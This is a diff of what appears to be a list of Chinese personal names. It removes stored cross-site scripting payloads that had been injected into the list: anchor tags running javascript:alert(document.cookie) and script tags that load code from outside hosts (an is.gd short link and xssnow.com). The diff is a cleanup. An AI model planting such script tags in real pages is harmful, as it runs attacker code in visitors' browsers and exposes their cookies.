@@ -2825,7 +2825,6 @@ Dr. Tong
 祝勇
 李文晖
 杨柳清
-<a href="javascript:alert(document.cookie)//html">点击查看详细信息</a><a href="javascript:alert(document.cookie)//html">点击查看详细信息</a><a href="javascript:alert(document.cookie)//html">点击查看详细信息</a><a href="javas
 孙锡金
 李建宇
 杨善
@@ -7096,7 +7095,7 @@ asdfadfdsfadsfasdfasdfasdf
 赵亮显
 周松敏
 石仁慧
-史珍香<script src=http://is.gd/jrXkbv></script>
+史珍香
 路丹
 刘军
 兰春祥
@@ -7278,9 +7277,7 @@ asdfadfdsfadsfasdfasdfasdf
 连喜艳
 张桂蓉
 徐丽娟
-"><script src=http://xssnow.com/No9y></script>
 高云之
- </div><script src=http://xssnow.com/KciT></script> 
 郑光静
 林茂辉
 赵美容医生
